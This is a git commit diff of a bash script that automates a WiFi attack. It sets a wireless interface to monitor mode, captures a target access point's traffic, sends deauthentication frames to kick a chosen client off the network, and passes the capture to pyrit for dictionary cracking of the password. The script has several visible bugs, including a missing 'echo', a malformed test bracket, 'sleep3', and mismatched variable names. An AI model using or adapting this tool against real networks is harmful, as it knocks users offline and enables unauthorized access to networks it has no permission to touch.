0a8f2be2d3132dc6d9b64577c56cf07c39c50042
root <root@localhost.localdomain>
2017-06-01 01:28:19 +0000

    stop to check deauth

--- autoWaka.sh
+++ autoWaka.sh
@@ -2,7 +2,7 @@
 echo "           AUTO WIFI With airolib";
 echo "           ======================";
 echo "All variables are strict - failing is in your hands";
-echo "This program makes use of Pyrit and the AirodunpLib";
+echo "This depends on Pyrit, AiroLib, libcap-dev";
 read -p "What you want to call this: " Proj;
 read -p "What Interface will you use: " Iface;
 mon=$Iface'mon';
@@ -12,13 +12,13 @@ read -p "What Channel is the AP on: " chn;
 
 #Lets Play ball
 echo "checking for Project Folder";
-if [ -d ../$Proj ]
-then
+proj=_projs/$Proj
+if [ -d $proj ];then
 	echo "Clearing old Content";
-	rm -rf ../$Proj/*.*
+	rm -rf $proj/*.*
 else
 	"Creating New Dir";
-	mkdir ../$Proj
+	mkdir $proj
 fi
 
 echo "checking wlan1mon";
@@ -26,14 +26,12 @@ airmon-ng check kill
 airmon-ng start $Iface --channel $chn
 echo "monitor is set on $mon";
 echo "For Good Riddance we need to wait a second";
-
-echo "Pasting to new shell";
 gnome-terminal -x sh -c "
 	sleep 4;
-	cd ../$Proj;
-	airodump-ng -c $chn --bssid $BSSID -w $Proj $mon;
+	cd $proj;
+	airodump-ng -c $chn --bssid $BSSID -w $proj $mon;
 	"
-echo "Check airoDump Manually for a Client";
+echo "Check airoDump Manually for a Client, wait a second";
 sleep 10;
 read -p "Do you have a client Mac: " Client;
 
@@ -45,6 +43,8 @@ echo "Opening new Shell for Deauth";
 gnome-terminal -x sh -c "
 	sleep 3;
 	aireplay-ng -0 $dauth -a $BSSID -c $Client $mon;
+	read -n1 -p "Press Enter to Exit" key;
+
 	"
 echo "sleeping for " $deauth
 sleep $dauth;
@@ -73,10 +73,9 @@ if [-e wordlist/*.db ]; then
 	echo "Loading dictionary"
 
 	gnome-terminal -x sh -c "
-		cd ../$Proj;
+		cd $proj;
 		sleep3;
 		pyrit eval;
-
 		sleep3;
 		cap='find *.cap';
 		echo "ready to analyze  " $cap
